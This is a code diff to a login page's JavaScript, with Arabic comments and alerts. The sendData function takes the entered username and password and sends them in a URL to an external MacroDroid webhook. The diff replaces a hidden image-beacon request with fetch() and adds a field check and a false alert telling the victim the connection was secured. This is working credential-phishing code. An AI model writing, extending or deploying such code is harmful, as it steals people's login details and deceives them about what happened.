@@ -49,11 +49,23 @@ function sendData() {
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
+    // التحقق من تعبئة الحقول
+    if (!username || !password) {
+        alert('❌️ الرجاء تعبئة اسم المستخدم وكلمة المرور');
+        return;
+    }
+
     // إعداد رابط الـ webhook مع المتغيرات
     const webhook_url = `https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
 
-    // إرسال الطلب في الخلفية باستخدام كائن Image
-    const img = new Image();
-    img.src = webhook_url;
+    // إرسال الطلب في الخلفية باستخدام fetch
+    fetch(webhook_url)
+        .then(response => response.text())
+        .then(data => {
+            alert('✅️ تم تأمين الاتصال بنجاح.');
+        })
+        .catch(error => {
+            alert('❌️ حدث خطأ أثناء محاولة الاتصال.');
+        });
 }
 </script>
